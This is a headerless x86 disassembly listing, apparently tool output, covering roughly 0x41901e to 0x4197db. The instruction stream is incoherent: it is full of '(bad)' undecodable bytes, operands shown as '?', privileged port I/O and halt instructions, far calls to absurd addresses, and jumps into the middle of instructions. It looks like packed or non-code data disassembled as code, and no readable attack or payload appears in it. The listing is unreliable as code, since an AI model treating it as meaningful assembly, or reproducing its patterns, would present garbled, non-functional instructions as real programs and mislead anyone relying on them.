  41901e:	stos   BYTE PTR es:[edi],al
  41901f:	imul   eax,DWORD PTR [ebx+0x38c1b1ca],0xffffff8d
  419026:	pop    edx
  419027:	cmp    bh,bl
  419029:	push   0xedcde16
  41902e:	call   0xdeb14a3b
  419033:	retf   0x4823
  419036:	xor    eax,edi
  419038:	pop    ebp
  419039:	pop    ebx
  41903a:	or     al,0x6b
  41903c:	retf   0x74f0
  41903f:	ja     0x41903d
  419041:	repz xchg edx,eax
  419043:	mov    dl,BYTE PTR [edi]
  419045:	mov    edx,0xf8f3681e
  41904a:	imul   edi,DWORD PTR [ebx+0x3279e5d0],0x3
  419051:	rcr    BYTE PTR [ebp-0x1a],cl
  419054:	idiv   DWORD PTR [eax-0x703ca309]
  41905a:	test   edx,ebx
  41905c:	mov    bp,0xc1c0
  419060:	adc    BYTE PTR [eax-0x43],ah
  419063:	in     eax,0xc2
  419065:	jb     0x419031
  419067:	mov    dh,0x94
  419069:	push   eax
  41906a:	dec    eax
  41906b:	repnz inc ecx
  41906d:	jl     0x419049
  41906f:	lods   eax,DWORD PTR ds:[esi]
  419070:	sbb    al,0xfb
  419072:	or     DWORD PTR [edi-0x76e8418f],eax
  419078:	sbb    esi,DWORD PTR [edx]
  41907a:	mov    ?,WORD PTR [edx-0x36adaf79]
  419080:	mov    esi,0x3de6e20a
  419085:	jns    0x4190fc
  419087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419088:	ret    
  419089:	sub    ecx,edi
  41908b:	stc    
  41908c:	sub    eax,0x278e7c2f
  419091:	(bad)  
  419093:	inc    eax
  419094:	lahf   
  419095:	and    BYTE PTR [ecx],0x66
  419098:	add    edi,ebp
  41909a:	mov    cl,BYTE PTR [edi+0xa4d2d5c]
  4190a0:	jecxz  0x4190aa
  4190a2:	call   0x30bf9f9f
  4190a7:	les    ebx,FWORD PTR [edx]
  4190a9:	lea    edi,[ecx-0x670c304d]
  4190af:	xchg   DWORD PTR [ebp-0x17],ebx
  4190b2:	jg     0x419118
  4190b4:	aaa    
  4190b5:	adc    al,dh
  4190b7:	jne    0x4190b8
  4190b9:	jecxz  0x4190b2
  4190bb:	or     al,0x14
  4190bd:	clc    
  4190be:	fs sbb eax,0x2412d17
  4190c4:	add    eax,0x3dfbb4e2
  4190c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190ca:	hlt    
  4190cb:	mov    ?,edx
  4190cd:	adc    al,0x5b
  4190cf:	xor    BYTE PTR [ebp-0x123993a7],bh
  4190d5:	outs   dx,DWORD PTR ds:[esi]
  4190d6:	xchg   edx,eax
  4190d7:	sar    ecx,0xd9
  4190da:	(bad)  
  4190db:	jg     0x419083
  4190dd:	lds    edx,FWORD PTR [ebx+edi*1-0x4849fed6]
  4190e4:	xor    ebp,DWORD PTR [edi]
  4190e6:	ror    BYTE PTR [esi],1
  4190e8:	inc    eax
  4190e9:	fistp  DWORD PTR [eax+0x3f]
  4190ec:	push   edx
  4190ed:	xchg   esi,eax
  4190ee:	les    edx,FWORD PTR [eax+0x7c]
  4190f1:	gs popf 
  4190f3:	and    al,BYTE PTR [eax+0x53]
  4190f6:	mov    al,0x9a
  4190f8:	xor    al,0x43
  4190fa:	xchg   edx,eax
  4190fb:	dec    ebx
  4190fc:	inc    ebp
  4190fd:	rcl    BYTE PTR [edx+eax*2-0x5b],0xec
  419102:	out    dx,eax
  419103:	mov    dx,0xefc3
  419107:	xor    BYTE PTR [ebx+0x43],bh
  41910a:	sub    DWORD PTR [eax],esp
  41910c:	ins    BYTE PTR es:[edi],dx
  41910d:	mov    edi,0xe533d6e2
  419112:	pop    edi
  419113:	in     eax,dx
  419114:	xlat   BYTE PTR ds:[ebx]
  419115:	sub    edi,DWORD PTR [edi]
  419117:	test   BYTE PTR [ebx],bh
  419119:	add    BYTE PTR [eax+0x34],bh
  41911c:	call   0x1064e25b
  419121:	ins    BYTE PTR es:[edi],dx
  419122:	mov    ebp,0x196b68fd
  419127:	cs loopne 0x419189
  41912a:	out    dx,al
  41912b:	mov    edi,edx
  41912d:	pop    esp
  41912e:	mov    ecx,0xf4d8b738
  419133:	sub    ebp,DWORD PTR [ebx]
  419135:	xor    ebp,DWORD PTR [esi-0x46598b26]
  41913b:	jns    0x419194
  41913d:	pop    ecx
  41913e:	inc    esp
  41913f:	popf   
  419140:	test   BYTE PTR [edx+0x69fcb8ba],bl
  419146:	pop    es
  419147:	lahf   
  419148:	mov    ebp,0xd1301a39
  41914d:	mov    ah,0x1e
  41914f:	fdiv   QWORD PTR [ecx+0x27]
  419152:	push   ds
  419153:	daa    
  419154:	loopne 0x4191b4
  419156:	add    eax,0x2bb94826
  41915b:	pop    ecx
  41915c:	je     0x4190e9
  41915e:	mov    esi,0xd5b2ef0
  419163:	adc    eax,0x5e29df01
  419168:	aas    
  419169:	shr    BYTE PTR [ebp+edi*2+0x62],1
  41916d:	frstor [ebp-0x60]
  419170:	pushf  
  419171:	scas   al,BYTE PTR es:[edi]
  419172:	adc    DWORD PTR [edx-0x66f6216b],esi
  419178:	nop
  419179:	js     0x4191c1
  41917b:	test   esi,esi
  41917d:	push   ds
  41917e:	in     al,0xd4
  419180:	icebp  
  419181:	xor    al,0x1d
  419183:	xor    BYTE PTR [ebx],ch
  419185:	jno    0x419182
  419187:	ret    0x85cf
  41918a:	in     al,dx
  41918b:	fist   WORD PTR [ebx-0x7f]
  41918e:	ror    BYTE PTR [eax+0x13d85166],0xcc
  419195:	dec    edx
  419196:	dec    ecx
  419197:	mov    ds:0xc000a0b0,eax
  41919c:	frstor [ebx-0x1c2b8f66]
  4191a2:	fwait
  4191a3:	inc    eax
  4191a4:	les    edx,FWORD PTR [edx-0x3d]
  4191a7:	add    cl,BYTE PTR [edi-0x60]
  4191aa:	imul   edx,DWORD PTR [eax+edx*8+0x10],0xfffffff4
  4191af:	loope  0x4191b0
  4191b1:	fcmovnb st,st(6)
  4191b3:	adc    eax,0xedeb1938
  4191b8:	pop    esp
  4191b9:	mov    dh,0x29
  4191bb:	mov    ?,WORD PTR [edx]
  4191bd:	push   ecx
  4191be:	lahf   
  4191bf:	push   eax
  4191c0:	aaa    
  4191c1:	dec    esi
  4191c2:	push   0x37441918
  4191c7:	retf   
  4191c8:	scas   eax,DWORD PTR es:[edi]
  4191c9:	cmp    DWORD PTR [esi],esp
  4191cb:	xchg   ebp,eax
  4191cc:	push   ds
  4191cd:	fdiv   QWORD PTR [ecx-0x3187f29b]
  4191d3:	test   bh,dh
  4191d5:	(bad)  
  4191d7:	(bad)  
  4191da:	popf   
  4191db:	in     al,dx
  4191dc:	fimul  WORD PTR [eax]
  4191de:	jge    0x4191e3
  4191e0:	into   
  4191e1:	mov    ebp,0xe8b1a96d
  4191e6:	iret   
  4191e7:	dec    ebx
  4191e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191e9:	push   esi
  4191ea:	dec    esp
  4191eb:	or     BYTE PTR ds:0xfab5656b,cl
  4191f1:	mov    ch,0x1b
  4191f3:	adc    al,0xbc
  4191f5:	dec    ecx
  4191f6:	hlt    
  4191f7:	cwde   
  4191f8:	xchg   bl,al
  4191fa:	push   edi
  4191fb:	mov    cl,0x19
  4191fd:	mov    ds:0x59951062,eax
  419202:	jne    0x4191fc
  419204:	fcom   st(5)
  419206:	sbb    al,0x63
  419208:	mov    edx,0x783824
  41920d:	push   ss
  41920e:	cmp    dh,dh
  419210:	push   eax
  419211:	rol    esi,cl
  419213:	dec    edi
  419214:	mov    edx,0xd3dcb028
  419219:	in     al,0x5
  41921b:	popa   
  41921c:	cmp    dh,cl
  41921e:	mov    cl,0x67
  419220:	dec    eax
  419221:	loopne 0x419263
  419223:	jns    0x419286
  419225:	in     eax,0x49
  419227:	stos   DWORD PTR es:[edi],eax
  419228:	lods   eax,DWORD PTR ds:[esi]
  419229:	(bad)
  41922c:	mov    eax,ds:0x8bb37446
  419231:	ins    DWORD PTR es:[edi],dx
  419232:	jecxz  0x41920b
  419234:	jae    0x419269
  419236:	pusha  
  419237:	sbb    eax,0x1db56e9d
  41923c:	adc    ch,BYTE PTR [esi-0x16]
  41923f:	jne    0x4191f5
  419241:	sbb    al,0x9e
  419243:	popf   
  419244:	cmp    ch,BYTE PTR [ebp+edx*1-0x1c299fa5]
  41924b:	imul   esi,DWORD PTR [edx-0x40],0x65
  41924f:	cmp    eax,0x2c6734db
  419254:	aaa    
  419255:	popf   
  419256:	loopne 0x41927b
  419258:	retf   
  419259:	popf   
  41925a:	cmp    BYTE PTR [edi],ah
  41925c:	jecxz  0x419265
  41925e:	pop    ds
  41925f:	xchg   esi,eax
  419260:	imul   eax,DWORD PTR [ecx],0x37f39217
  419266:	mov    eax,ds:0xb63637fa
  41926b:	loop   0x419269
  41926d:	dec    esp
  41926e:	cmp    DWORD PTR [ebx-0x22],0x64
  419272:	sbb    dl,BYTE PTR [esi+edx*4+0x4807aca3]
  419279:	lahf   
  41927a:	test   DWORD PTR cs:[eax+esi*2+0x1e],esp
  41927f:	ja     0x4192f5
  419281:	mov    ds:0xaf6d94cc,eax
  419286:	(bad)  
  419287:	icebp  
  419288:	sbb    BYTE PTR [esi],dh
  41928a:	push   cs
  41928b:	pop    ds
  41928c:	and    eax,eax
  41928e:	(bad)  
  41928f:	and    al,0xfa
  419291:	push   0x30
  419293:	stos   DWORD PTR es:[edi],eax
  419294:	pop    esp
  419295:	outs   dx,BYTE PTR ds:[esi]
  419296:	fwait
  419297:	sbb    al,0x74
  419299:	push   es
  41929a:	pop    ebp
  41929b:	call   FWORD PTR [esi+0x18]
  41929e:	repz and al,0xc6
  4192a1:	out    dx,al
  4192a2:	lock stos DWORD PTR es:[edi],eax
  4192a4:	call   0x936cf15
  4192a9:	mov    ss,WORD PTR [edi-0x50dcb9b2]
  4192af:	ret    0x64d8
  4192b2:	shr    dh,1
  4192b4:	outs   dx,DWORD PTR ds:[esi]
  4192b5:	les    esp,FWORD PTR [edi-0x6ecb3351]
  4192bb:	loop   0x4192fe
  4192bd:	jae    0x41925a
  4192bf:	pop    esp
  4192c0:	mov    bl,BYTE PTR [ebx]
  4192c2:	data16 xchg BYTE PTR [ecx-0x2],al
  4192c6:	cmc    
  4192c7:	(bad)
  4192cc:	ret    
  4192cd:	(bad)  
  4192ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192cf:	loop   0x4192a7
  4192d1:	outs   dx,DWORD PTR ds:[esi]
  4192d2:	push   eax
  4192d3:	xchg   ebx,eax
  4192d4:	adc    ecx,DWORD PTR [ebx+esi*1-0x54]
  4192d8:	out    dx,al
  4192d9:	pop    ecx
  4192da:	imul   edi,DWORD PTR [ebp+0x5aa192d7],0xffffffae
  4192e1:	push   0xffffff8c
  4192e3:	adc    eax,0xc48f4029
  4192e8:	loope  0x4192f3
  4192ea:	xor    ecx,esp
  4192ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ed:	xlat   BYTE PTR ds:[ebx]
  4192ee:	cld    
  4192ef:	imul   DWORD PTR [eax]
  4192f1:	push   ecx
  4192f2:	add    eax,0x41de2702
  4192f7:	cmp    edx,ebp
  4192f9:	cdq    
  4192fa:	cs std 
  4192fc:	xor    DWORD PTR [edi+ecx*8-0x77],edi
  419300:	sbb    DWORD PTR [eax+0x29],edi
  419303:	retf   0x94da
  419306:	pushf  
  419307:	adc    DWORD PTR [eax+0xe],esi
  41930a:	shl    BYTE PTR fs:[ebp-0x73],1
  41930e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419310:	push   ss
  419311:	cmp    ecx,DWORD PTR [ebp+0xecb5ef8]
  419317:	add    eax,0x3145dcff
  41931c:	pop    ebx
  41931d:	lea    esi,[ecx+0x53b944ac]
  419323:	push   es
  419324:	and    eax,0xcf624b82
  419329:	ins    DWORD PTR es:[edi],dx
  41932a:	stos   DWORD PTR es:[edi],eax
  41932b:	shl    DWORD PTR fs:[ecx+0x56c145e7],cl
  419332:	pop    esi
  419333:	and    edx,DWORD PTR [ecx]
  419335:	lods   al,BYTE PTR ds:[esi]
  419336:	(bad)  
  419337:	add    dh,BYTE PTR [edx]
  419339:	sub    eax,0x28197976
  41933e:	iret   
  41933f:	popa   
  419340:	test   eax,0xc6bb33db
  419345:	and    eax,0xf57bb318
  41934a:	push   0xaa4ab30f
  41934f:	lahf   
  419350:	or     DWORD PTR [ebx+0x3f],esp
  419353:	jb     0x41931b
  419355:	shl    BYTE PTR [esi+ecx*1],cl
  419358:	or     al,0xbf
  41935a:	rcl    BYTE PTR [ebp-0x438926a2],cl
  419360:	inc    ebx
  419361:	or     ch,BYTE PTR [eax+ebx*4+0xd996f22]
  419368:	inc    edi
  419369:	cwde   
  41936a:	push   esp
  41936b:	cmp    al,0x7c
  41936d:	cwde   
  41936e:	mov    edx,0xe185bfc2
  419373:	fimul  WORD PTR [edx-0x4821fe10]
  419379:	jle    0x419399
  41937b:	xchg   edi,eax
  41937c:	jne    0x419330
  41937e:	push   0x356b72c1
  419383:	ja     0x41939f
  419385:	xor    al,0x97
  419387:	mov    ah,BYTE PTR [ebx-0x4d8f9dcf]
  41938d:	int3   
  41938e:	outs   dx,DWORD PTR ds:[esi]
  41938f:	jbe    0x419351
  419391:	jp     0x4193f2
  419393:	inc    ebp
  419394:	cmp    al,BYTE PTR [edx]
  419396:	loope  0x4193a4
  419398:	ret    0x1d02
  41939b:	in     eax,dx
  41939c:	sub    al,0x8e
  41939e:	ins    BYTE PTR es:[edi],dx
  41939f:	repnz in al,0x54
  4193a2:	and    bh,dh
  4193a4:	jg     0x419406
  4193a6:	jmp    0x41936b
  4193a8:	fidiv  WORD PTR [edi+0x4]
  4193ab:	(bad)  
  4193ac:	pop    edx
  4193ad:	sbb    DWORD PTR [ecx-0x3bb2e9b1],0x4
  4193b4:	repz (bad) 
  4193b6:	jg     0x419437
  4193b8:	mov    esp,0xf2c5e64a
  4193bd:	push   cs
  4193be:	inc    ecx
  4193bf:	lea    edi,[esi-0x5e876b4]
  4193c5:	add    BYTE PTR [edi+edi*8+0x36],dh
  4193c9:	retf   
  4193ca:	dec    esp
  4193cb:	push   es
  4193cc:	ins    DWORD PTR es:[edi],dx
  4193cd:	mov    ah,0xbf
  4193cf:	(bad)  
  4193d1:	pop    ebp
  4193d2:	jo     0x419397
  4193d4:	mov    BYTE PTR [esi],dl
  4193d6:	test   al,0x2
  4193d8:	out    0x2a,eax
  4193da:	jge    0x4193a8
  4193dc:	call   0xe59ac184
  4193e1:	mov    eax,0x766161
  4193e6:	bound  ebp,QWORD PTR [esi]
  4193e8:	pushf  
  4193e9:	or     al,0xa3
  4193eb:	gs push ebp
  4193ed:	and    DWORD PTR [ecx+edx*2],edi
  4193f0:	hlt    
  4193f1:	lods   al,BYTE PTR ds:[esi]
  4193f2:	cwde   
  4193f3:	mov    BYTE PTR [ebx],ah
  4193f5:	inc    ecx
  4193f6:	jge    0x4193ab
  4193f8:	dec    eax
  4193f9:	sbb    dl,ah
  4193fb:	sbb    BYTE PTR [edx],dl
  4193fd:	icebp  
  4193fe:	mov    bl,0xa5
  419400:	into   
  419401:	imul   esp,DWORD PTR [esi-0x6a],0x3f
  419405:	adc    al,0x52
  419407:	push   0x947ef7c1
  41940c:	xchg   esi,eax
  41940d:	dec    ecx
  41940e:	fimul  WORD PTR [eax+eiz*8]
  419411:	push   ebp
  419412:	rcl    BYTE PTR [ecx],0xeb
  419415:	sahf   
  419416:	cmp    eax,0x906db9bb
  41941b:	into   
  41941c:	pop    esi
  41941d:	call   0x47f8d88d
  419422:	inc    esp
  419423:	lahf   
  419424:	pop    esi
  419425:	mov    bh,0xa4
  419427:	ins    WORD PTR es:[edi],dx
  419429:	push   esi
  41942a:	inc    edx
  41942b:	fidiv  WORD PTR [eax]
  41942d:	pop    edx
  41942e:	ror    BYTE PTR [eax],cl
  419430:	nop
  419431:	hlt    
  419432:	out    dx,al
  419433:	xchg   DWORD PTR [eax+0x6c],ebp
  419436:	popf   
  419437:	push   cs
  419438:	sbb    al,0xd
  41943a:	call   0xb802:0x157ed1a2
  419441:	pop    ss
  419442:	mov    ah,0xc1
  419444:	rcr    DWORD PTR [esi],1
  419446:	test   al,0xb9
  419448:	push   0xffffffa5
  41944a:	data16 fsub st(4),st
  41944d:	(bad)  
  41944e:	fimul  WORD PTR [esi]
  419450:	lock lods al,BYTE PTR ds:[esi]
  419452:	iret   
  419453:	imul   edi,DWORD PTR [esi+0x44ecc569],0x82f15d6e
  41945d:	push   ss
  41945e:	rcr    ch,cl
  419460:	xchg   edi,eax
  419462:	or     BYTE PTR [edx+0x49],dh
  419465:	je     0x4194bc
  419467:	xlat   BYTE PTR ds:[ebx]
  419468:	outs   dx,BYTE PTR ds:[esi]
  419469:	imul   esp,DWORD PTR [edx+ebx*8+0x51],0x98abd1c5
  419471:	mov    dl,0x14
  419473:	jnp    0x419476
  419475:	xor    ch,ah
  419477:	and    eax,ebx
  419479:	push   ebx
  41947a:	into   
  41947b:	sbb    edi,DWORD PTR [eax]
  41947d:	ds out dx,eax
  41947f:	inc    ecx
  419480:	aas    
  419481:	loopne 0x419457
  419483:	cmp    al,0x10
  419485:	or     ecx,DWORD PTR [ecx]
  419487:	(bad)  
  419488:	nop    DWORD PTR [edi+ecx*1]
  41948c:	call   0xcb86:0x20c7ac03
  419493:	jg     0x4194be
  419495:	mul    edx
  419497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419498:	int    0xef
  41949a:	mov    dl,0xea
  41949c:	mov    eax,0xa4bf5b58
  4194a1:	sub    DWORD PTR [eax-0x3a],ecx
  4194a4:	jae    0x4194e9
  4194a6:	sbb    ah,ch
  4194a8:	jne    0x419522
  4194aa:	ret    0x76b5
  4194ad:	xor    cl,dl
  4194af:	xor    BYTE PTR [edx+0x62253ffe],dl
  4194b5:	clc    
  4194b6:	add    dl,BYTE PTR [ebx-0x66]
  4194b9:	dec    eax
  4194ba:	shl    BYTE PTR [ecx+0x4b8da22e],1
  4194c0:	ins    DWORD PTR es:[edi],dx
  4194c1:	test   BYTE PTR [eax+0x333f424c],cl
  4194c7:	and    DWORD PTR [ebx],0xffffffd4
  4194ca:	out    0x7a,eax
  4194cc:	hlt    
  4194cd:	inc    eax
  4194ce:	aad    0x6e
  4194d0:	popa   
  4194d1:	das    
  4194d2:	xchg   ebp,eax
  4194d3:	pop    ss
  4194d4:	ror    BYTE PTR [esi],cl
  4194d6:	lahf   
  4194d7:	(bad)  [ecx+0x1b]
  4194da:	pop    eax
  4194db:	(bad)  
  4194dc:	fmul   DWORD PTR [ebp+0x61df8aa4]
  4194e2:	enter  0xb65e,0x4
  4194e6:	inc    ebx
  4194e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194e8:	pop    ecx
  4194e9:	mov    esp,0x2a6c9dc1
  4194ee:	jmp    0xcacb9416
  4194f3:	daa    
  4194f4:	mov    dl,0xe9
  4194f6:	add    al,0xa2
  4194f8:	sub    al,0x3a
  4194fa:	push   ebp
  4194fb:	sub    BYTE PTR [eax],0x79
  4194fe:	mov    ecx,0xe0147fc3
  419503:	test   eax,0x43b50092
  419508:	fs call 0xc67530b0
  41950e:	sub    eax,0x2294483e
  419513:	in     eax,0x36
  419515:	mov    dh,0x32
  419517:	fisubr WORD PTR [ebp-0x69dd04d3]
  41951d:	and    eax,0x3e4bef80
  419522:	and    al,0x5e
  419524:	mov    bh,0xe1
  419526:	(bad)  
  419527:	pop    ebx
  419528:	jb     0x419554
  41952a:	fsubr  st,st(0)
  41952c:	enter  0xf5bf,0x4f
  419530:	out    0x15,al
  419532:	jbe    0x419533
  419534:	xchg   ecx,eax
  419535:	xchg   ecx,eax
  419536:	sbb    ah,bh
  419538:	scas   al,BYTE PTR es:[edi]
  419539:	mov    ebp,ebx
  41953b:	call   0xffd30c6b
  419540:	pop    es
  419541:	xor    bh,dh
  419543:	(bad)  
  419544:	xchg   ecx,eax
  419545:	adc    al,0x6b
  419547:	mov    al,0x30
  419549:	pop    ds
  41954a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41954b:	push   ds
  41954c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41954d:	sub    ecx,ecx
  41954f:	inc    esp
  419550:	add    al,0x40
  419552:	retf   0x3642
  419555:	lds    ebx,FWORD PTR [edi]
  419557:	pop    ebp
  419558:	add    BYTE PTR [ecx-0x7d],0x18
  41955c:	jp     0x419519
  41955e:	imul   eax,ecx,0x16
  419561:	push   ebx
  419562:	dec    edx
  419563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419564:	int    0x7a
  419566:	cmp    ah,BYTE PTR [ebx+eiz*2-0x64876299]
  41956d:	(bad)  
  41956e:	sbb    cl,bh
  419570:	icebp  
  419571:	fs ret 
  419573:	jne    0x41952b
  419575:	lods   al,BYTE PTR ds:[esi]
  419576:	push   edx
  419577:	je     0x41957e
  419579:	xor    bh,BYTE PTR [edx]
  41957b:	ins    DWORD PTR es:[edi],dx
  41957c:	push   ss
  41957d:	mov    ch,0x38
  41957f:	daa    
  419580:	add    al,0x2
  419582:	add    BYTE PTR [eax-0x3dd077a2],cl
  419588:	cmp    ebx,DWORD PTR [ebx+0xf19f63]
  41958e:	mov    al,ds:0xd9f7fa7e
  419593:	pusha  
  419594:	mov    ds:0x17631e61,eax
  419599:	lock mov esi,0xb6838ce7
  41959f:	inc    eax
  4195a0:	pop    edx
  4195a1:	mov    edx,0x1b05d101
  4195a6:	not    BYTE PTR [eax+0x248a7533]
  4195ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195ad:	std    
  4195ae:	pop    esp
  4195b0:	addr16 push es
  4195b2:	aam    0x30
  4195b4:	outs   dx,DWORD PTR ds:[esi]
  4195b5:	mov    ebx,0x78f351bd
  4195ba:	aam    0x2c
  4195bc:	add    dl,BYTE PTR [eax-0x54]
  4195bf:	pop    ecx
  4195c0:	nop
  4195c1:	bnd jg 0x4195a7
  4195c4:	frstor [edx]
  4195c6:	arpl   WORD PTR [ecx+0x5],di
  4195c9:	inc    ecx
  4195ca:	push   ds
  4195cb:	mov    DWORD PTR [ebp-0xc],esp
  4195ce:	lods   al,BYTE PTR ds:[esi]
  4195cf:	jo     0x41957e
  4195d1:	or     edx,DWORD PTR [ebp-0x15f49eb1]
  4195d7:	jae    0x419636
  4195d9:	scas   al,BYTE PTR es:[edi]
  4195da:	mov    ebx,0x2764e8e9
  4195df:	mov    dl,0x54
  4195e1:	xchg   edi,eax
  4195e2:	test   ebp,edx
  4195e4:	int3   
  4195e5:	(bad)  
  4195e6:	xor    ebx,edi
  4195e8:	cmp    BYTE PTR [eax],cl
  4195ea:	clc    
  4195eb:	popf   
  4195ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195ed:	adc    DWORD PTR [edi+0x2b28cbda],esi
  4195f3:	rol    BYTE PTR [edx],1
  4195f5:	jle    0x419676
  4195f7:	adc    ch,ch
  4195f9:	adc    ah,BYTE PTR cs:[ecx+0x6a]
  4195fd:	lods   al,BYTE PTR ds:[esi]
  4195fe:	(bad)  [ebp-0x38]
  419602:	push   eax
  419603:	ins    BYTE PTR es:[edi],dx
  419604:	(bad)  
  419605:	fbld   TBYTE PTR [ecx]
  419607:	in     eax,0x9c
  419609:	js     0x4195ab
  41960b:	stc    
  41960c:	fstp   QWORD PTR [ecx+edi*8]
  41960f:	push   ss
  419610:	mov    ah,BYTE PTR [ebx-0x40]
  419613:	or     DWORD PTR [edx+0x33d1963c],0x18
  41961a:	mov    ds:0x58ab1cc8,eax
  41961f:	add    DWORD PTR [esi+0x47],0xd105117f
  419626:	jp     0x4195bd
  419628:	pop    esp
  419629:	fidivr DWORD PTR [edx+0xf]
  41962c:	push   ebp
  41962d:	into   
  41962e:	pop    es
  41962f:	(bad)
  419633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419634:	imul   edx,DWORD PTR [ebx+0x48dde323],0x65
  41963b:	add    DWORD PTR [eax-0xcae5f4f],eax
  419641:	arpl   WORD PTR [ebx*1-0x2618306a],dx
  419648:	inc    edx
  419649:	and    esi,DWORD PTR [eax-0x4ab01b4]
  41964f:	ret    
  419650:	push   edx
  419651:	mov    cl,0x70
  419653:	and    BYTE PTR ds:0x66f834ac,ch
  419659:	push   ebx
  41965a:	out    0x6d,al
  41965c:	dec    edx
  41965d:	fs out dx,eax
  41965f:	ficomp WORD PTR [esi]
  419661:	push   0x310a5916
  419666:	lds    esi,FWORD PTR [eax+ebx*8-0x59]
  41966a:	xor    BYTE PTR ds:0xf585f48a,0xae
  419671:	icebp  
  419672:	xchg   ebp,eax
  419673:	mov    eax,ss:0xb3cda4c8
  419679:	es ret 
  41967b:	ret    0xcf9e
  41967e:	mov    ds:0xa1ed0e34,al
  419683:	xor    bl,BYTE PTR [edi+0x53ff60fb]
  419689:	lea    ebp,[ecx]
  41968b:	xor    al,0x43
  41968d:	xor    DWORD PTR [edi],esi
  41968f:	jge    0x419683
  419691:	add    dh,BYTE PTR [ebp-0x24]
  419694:	enter  0x4a0c,0xd5
  419698:	cwde   
  419699:	push   edi
  41969a:	fdiv   DWORD PTR [edx-0xd]
  41969d:	pop    edi
  41969e:	add    cl,0xcb
  4196a1:	pop    ebp
  4196a2:	push   eax
  4196a3:	(bad)  
  4196a4:	sub    ebp,DWORD PTR [ebx+0x62335557]
  4196aa:	cmp    al,0x2a
  4196ac:	mov    eax,ds:0x92cf65ec
  4196b1:	and    edi,eax
  4196b3:	xor    al,0x55
  4196b5:	xchg   ebp,eax
  4196b6:	cmp    al,0x25
  4196b8:	push   edx
  4196b9:	or     eax,0x953a374
  4196be:	dec    ebx
  4196bf:	cmp    BYTE PTR [ebx+0x7b],0x36
  4196c3:	inc    ebp
  4196c4:	and    bl,bl
  4196c6:	xor    bl,0x2a
  4196c9:	test   DWORD PTR [ebx],eax
  4196cb:	aas    
  4196cc:	sub    bh,BYTE PTR [edx]
  4196ce:	mov    ch,al
  4196d0:	cdq    
  4196d1:	mov    eax,0x5f4a20fd
  4196d6:	sbb    eax,0x56c4de8f
  4196db:	es or  eax,0xde77476
  4196e1:	pop    eax
  4196e2:	sbb    DWORD PTR [edi+0x790edb5b],ebx
  4196e8:	(bad)  
  4196e9:	jne    0x419766
  4196eb:	push   es
  4196ec:	je     0x41971c
  4196ee:	call   0xda91:0xf5af81c1
  4196f5:	pop    ds
  4196f6:	imul   ebx,DWORD PTR [ebp+0x6c47e1e6],0xeba30ee8
  419700:	jnp    0x4196b8
  419702:	in     eax,dx
  419703:	js     0x4196fa
  419705:	xor    DWORD PTR [ecx-0x78bb3789],0x825d7c8d
  41970f:	xor    ecx,esp
  419711:	ins    BYTE PTR es:[edi],dx
  419712:	cwde   
  419713:	jle    0x419782
  419715:	dec    ebx
  419716:	xlat   BYTE PTR ds:[ebx]
  419717:	rol    BYTE PTR [ebp+0x7e],cl
  41971a:	xchg   esi,eax
  41971b:	push   es
  41971c:	je     0x419717
  41971e:	inc    ecx
  41971f:	mov    WORD PTR [edx],gs
  419721:	mov    ecx,DWORD PTR [edx-0x176d477e]
  419727:	aad    0xae
  419729:	xchg   ebx,eax
  41972a:	jge    0x41970e
  41972c:	dec    DWORD PTR [ebp-0x6110d32a]
  419732:	adc    ebp,DWORD PTR [edi-0x4068e002]
  419738:	pushf  
  419739:	sahf   
  41973a:	daa    
  41973b:	jb     0x4196d6
  41973d:	dec    eax
  41973e:	out    0xbf,eax
  419740:	mov    ah,0x69
  419742:	xchg   edi,eax
  419744:	retf   0xfa47
  419747:	mov    edi,0xcf8152a4
  41974c:	cmp    DWORD PTR [ecx-0x1f],ebx
  41974f:	jnp    0x41977b
  419751:	(bad)  
  419752:	leave  
  419753:	lods   al,BYTE PTR ds:[esi]
  419754:	(bad)  
  419755:	dec    esi
  419756:	(bad)  
  419758:	and    BYTE PTR ds:0xf27eed5f,cl
  41975e:	rol    eax,1
  419760:	imul   edx,esp,0xfffffff6
  419763:	jmp    0xa499:0x78b0b98
  41976a:	xchg   esi,eax
  41976b:	cmp    bh,BYTE PTR [edx+edx*2-0x45cef26a]
  419772:	in     al,dx
  419773:	sub    eax,0xb69bf9b7
  419778:	ja     0x4197a9
  41977a:	dec    esp
  41977b:	cmp    dl,BYTE PTR [esi-0x21]
  41977e:	fbstp  TBYTE PTR [esi+eax*4]
  419781:	repnz gs cwde 
  419784:	jnp    0x4197d3
  419786:	test   eax,0x249ec518
  41978b:	xlat   BYTE PTR ds:[ebx]
  41978c:	repnz retf 
  41978e:	sub    bh,ch
  419790:	jle    0x4197af
  419792:	sbb    dl,BYTE PTR [esp+edx*2+0x58cc2b45]
  419799:	inc    eax
  41979a:	cmp    al,0xca
  41979c:	mov    edx,DWORD PTR [ecx-0x36]
  41979f:	mov    ch,0xe5
  4197a1:	dec    ebx
  4197a2:	jbe    0x4197ba
  4197a4:	dec    esp
  4197a5:	shr    DWORD PTR [ebx+0x7d],0xf
  4197a9:	neg    DWORD PTR [ecx+0x1e41e7b6]
  4197af:	sbb    dl,al
  4197b1:	das    
  4197b2:	in     al,0x6f
  4197b4:	sub    DWORD PTR [ebx],0xd79e79ac
  4197ba:	stos   BYTE PTR es:[edi],al
  4197bb:	not    BYTE PTR [ecx-0x6a9d4a25]
  4197c1:	xchg   ebx,eax
  4197c2:	cmp    eax,0xd98d3bf1
  4197c7:	mov    BYTE PTR [eax-0x1bf3344],bh
  4197cd:	iret   
  4197ce:	addr16 pop ss
  4197d0:	scas   eax,DWORD PTR es:[edi]
  4197d1:	out    0xda,eax
  4197d3:	(bad)  
  4197d5:	aam    0x5c
  4197d7:	data16 shr bl,0xe9
  4197db:	clc    
